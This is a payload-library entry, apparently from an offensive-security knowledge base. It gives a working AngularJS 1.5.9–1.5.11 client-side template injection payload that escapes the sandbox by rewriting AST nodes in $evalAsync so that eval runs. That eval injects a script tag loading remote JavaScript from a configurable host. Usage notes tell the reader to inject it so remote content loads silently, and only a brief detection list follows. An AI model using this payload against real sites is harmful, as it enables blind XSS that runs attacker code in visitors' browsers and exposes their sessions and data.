---
id: a43f9aa1-5d45-4cf8-a348-e1a4227bc05f
type: code
language: JavaScript
verified: true
created_at: '2023-04-06T03:56:43.760757+00:00'
updated_at: '2023-04-10T20:24:53.221835+00:00'
tags:
  - CSTI
  - Blind XSS
  - AST Manipulation
  - AngularJS
platforms:
  - Web
  - Browser
validated: true
---

# AngularJS-AST-Manipulation-Script-Injection

## Code

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;
    C=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(`var _=document.createElement(\\''script\\');_.src=\\'//localhost/m\\';document.body.appendChild(_);`)))+';astNode.argument={type:'Identifier',name:'foo'};");
    m1=B($$asyncQueue.pop().expression,null,$root);
    m2=B(C,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## Description

This sophisticated payload manipulates AngularJS's AST parsing in $evalAsync to inject and execute a unary expression containing eval, enabling blind script injection for versions 1.5.9-1.5.11.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| localhost/m | External payload URL | //remote-server.com/js |

## Usage

Inject into async template contexts to alter the AST and trigger eval of the script creation code, loading remote content silently.

## Detection

- Anomalies in $evalAsync queue or AST nodes via Angular debug mode.
- Sandbox bypass indicators in version-specific logs.
- Dynamic unary expressions in code scanners.

## Related

- [[procedures/Client-Side-Template-Injection-using-Blind-XSS]]
